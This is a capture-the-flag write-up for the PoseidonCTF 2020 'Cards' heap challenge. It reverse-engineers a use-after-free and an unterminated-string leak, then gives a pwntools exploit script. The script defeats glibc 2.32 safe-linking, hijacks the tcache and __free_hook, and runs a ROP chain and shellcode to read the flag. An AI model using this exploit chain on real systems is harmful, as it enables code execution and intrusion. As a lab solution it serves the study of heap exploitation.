# PoseidonCTF 2020 - Cards (PWN)
### Why this challenge is interesting
glibc 2.32 introduced safe-linking, a rather interesting safety measure for the tcache. This glibc release is brand new, it was released 4 days prior to the CTF.

https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/

### TL;DR Writeup:
Safe-linking uses ASLR of the heap's address to XOR the tcache forward pointers. In this challenge, we can leak the heap address and proceed to take control of the tcache as normal with a UAF. From there, it's just about dealing with the malloc conditions + some spice from the challenge.


### Reverse Engineering
##### The Structs
```c
struct string{
    int size;
    int index;
    char* char_pointer;
};

struct card{
    int card_index;
    char card_color[8];
    string* card_name_ptr;
    int boolean;
};
```

##### Main
It's a pretty typical menu, but there is a hidden option. This buffer is obviously supposed to be used for ROP / shellcode.
```c
case 6uLL:
printf("Enter your secret name: ", a2);
a2 = (char **)&buf;
read(0, &buf, 0x40uLL);
break;
```

##### Init Function
```c
unsigned __int64 init_buf_alarm_seccomp(){
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  alarm(0x3Cu);
  seccomp();
}
``` 

```c
unsigned __int64 seccomp(){
  if ( prctl(38, 1LL, 0LL, 0LL, 0LL) )
  {
    perror("Seccomp Error");
    exit(1);
  }
  if ( prctl(22, 2LL, &unk_2020D0) == -1 )
  {
    perror("Seccomp Error");
    exit(1);
  }
}
```

Let's use seccomp-tools to see what's happening. Basically, we're only allowed to use the syscalls listed here:

```
ruby ~/.gem/ruby/2.7.0/bin/seccomp-tools dump ./cards
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x06 0x00 0x00 0x00000000  return KILL
```


##### Add Card
What's important here is that the card name is not null terminated. We could use this to leak things.
```c
unsigned __int64 add_card()
{
  int v0; // ebx
  card *v1; // rbx
  custom_string *v2; // rbx
  unsigned int size; // [rsp+4h] [rbp-1Ch]

  if ( chunk_index > 8 )
    error_exit("No");
  v0 = chunk_index;
  card_struct[v0] = malloc(0x28uLL);
  card_struct[chunk_index]->card_index = chunk_index;
  printf("Enter size of the name of the card: ");
  size = get_option();
  if ( size > 0x100 )
    error_exit("I'm not sure but you are not allowed to do that");
  v1 = card_struct[chunk_index];
  v1->card_name_ptr = malloc(0x28uLL);
  card_struct[chunk_index]->card_name_ptr->size = size;
  card_struct[chunk_index]->boolean = 1LL;
  v2 = card_struct[chunk_index]->card_name_ptr;
  v2->char_pointer = malloc(size);
  card_struct[chunk_index]->card_name_ptr->index = chunk_index;
  printf("Enter card color: ");
  read(0, card_struct[chunk_index]->card_color, 7uLL);
  printf("Enter name: ");
  read(0, card_struct[chunk_index]->card_name_ptr->char_pointer, size);
  puts("Done.");                                // not null terminated!
  sizes[chunk_index++] = size;
}
```

##### Edit Card
Here we've got a UAF. The function does not check if a card has been freed.
```c
unsigned __int64 edit_name(){
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  
  printf("Enter the index of the card: ");
  v1 = get_option();
  if ( v1 <= chunk_index && card_struct[v1]->boolean )// Use After Free!
  {
    printf("Enter new name: ");
    read(0, card_struct[v1]->card_name_ptr->char_pointer, sizes[v1]);
    puts("Edited");
  }
  else
  {
    puts("Nope");
  }
}
```

##### View Card
Nothing here, the function does proper checks. It just outputs the fields of a card.


## Exploit
Here is the exploit logic and comments. For the full file, see exploit.py
```python
#####################################
# LEAK THE HEAP'S BASE ADDRESS!
#####################################
# How do we do this?
# add_card does: malloc(0x28) for card struct, malloc(0x28) for string struct, malloc(input) for name string.
# rm_card frees card struct, string struct, then string itself.
# Let's use 0x28 as size for the name.
a = add_card(0x28, 'red', 'a'*0x28)

# After this free, the tcache bin will look like:
# name string -> string struct -> card struct
rm_card(a)

# Therefore, adding another card, our name string will take the 3rd element in the bin, the card struct.
# The card struct's 3rd member is a pointer to its string struct and it is still there in memory.
# We can leak it thanks to the fact that no null terminator is appended to our name string.
b = add_card(0x28, 'red', 'b'*0x10)
view_card(b)
p.recvuntil('Card name: ')
p.recv(0x10)
heap_base = u64(p.recv(6) + b'\x00\x00') - 0x2d0
log.info(f'Heap: {hex(heap_base)}')


#####################################
# TAKE CONTROL OF THE TCACHE!
#####################################
# We need the heap address to be able to encrypt and decrypt the FD pointers of free tcache bins.
# Let's take control of tcache_perthread_struct by allocating a chunk on it.
# We cannot use 0x28 size for this or the program's mallocs will break everything.
def protect_ptr(heap_addr, ptr):
    return (heap_addr >> 12) ^ ptr

tcache_fd = protect_ptr(heap_base, heap_base+0x10)
c = add_card(0xf8, 'red', 'a')
d = add_card(0xf8, 'red', 'ddddddd') # need to add 2 to put idx count to 2 or our added pointer wont be used
rm_card(d)
rm_card(c)
edit_name(c, p64(tcache_fd)) # d is lost forever lol rip
c = add_card(0xf8, 'red', 'ccccccccc') # same as c

# allocate to the tcache struct and set the 0x100 bin to 7 (full)
# This will be useful for leaking the libc address
tcache_perthread_struct = add_card(0xf8, 'red', p16(0) + p16(2) + p16(0)*12 + p16(7))


#####################################
# LEAK THE LIBC'S BASE ADDRESS!
#####################################
# this will go in the unsorted bin since the tcache is full. it now has pointers to libc
rm_card(c)

# let's take c back. for this, we need to set the tcache bin to empty,
# or it will try taking from there instead of the unsorted bin.
edit_name(tcache_perthread_struct, p16(0) + p16(2) + p16(0)*12 + p16(0))

# I cannot use the same size (0xf8) or it will trigger the exact match condition at malloc.c:3820
# This would cause malloc to place the chunk in the tcache and pop it right after, deleting the libc leaks...
c = add_card(0xe8, 'red', 'c'*8)
view_card(c)
p.recvuntil('c'*8)
libc_leak = u64(p.recv(6) + b'\x00\x00') - libc_leak_offset
libc_elf.address += libc_leak
add_rsp_0x38 += libc_leak
free_hook = libc_elf.sym['__free_hook']
log.info(f'Libc: {hex(libc_leak)}')
log.info(f'Free Hook: {hex(free_hook)}')


#####################################
# RUNNING ARBITRARY INSTRUCTIONS!
#####################################
# Let's modify the tcache struct again, to get a chunk on free_hook
# Modify free_hook to a gadget that simply adds 0x38 to RSP.
# Then if we add a secret name and call free right after, the 0x38 gadget will make it so that the return address is right on top of the first 8 bytes of our secret name :)
# So, the secret name ROP will call mprotect on the heap to make it executable.
# Then, we jump to a shellcode we placed on it.

# The ROP. mprotect is whitelisted by seccomp
rop = ROP(libc_elf)
rop.call('mprotect',  [heap_base, 0x1000, 7])
rop.call(heap_base+0x390)
log.info(f'ROP: \n{rop.dump()}')

# The shellcode. Because of seccomp, we have to use open, read and write syscalls.
edit_name(b, flag_path)
flag_str_addr = heap_base + 0x2a0
shellcode = shellcraft.linux.syscall('SYS_open', flag_str_addr, 'O_RDONLY', 0)
shellcode += shellcraft.linux.syscall('SYS_read', 'rax', heap_base, 32)
shellcode += shellcraft.linux.syscall('SYS_write', 1, heap_base, 32)
shellcode = asm(shellcode)
edit_name(c, shellcode)

# Let's trigger the execution!
edit_name(tcache_perthread_struct, p16(1) + p16(0)*63 + p64(free_hook))
free_hook = add_card(0x10, 'red', p64(add_rsp_0x38))
edit_secret_name(rop.chain())
rm_card(1)

p.interactive()
```
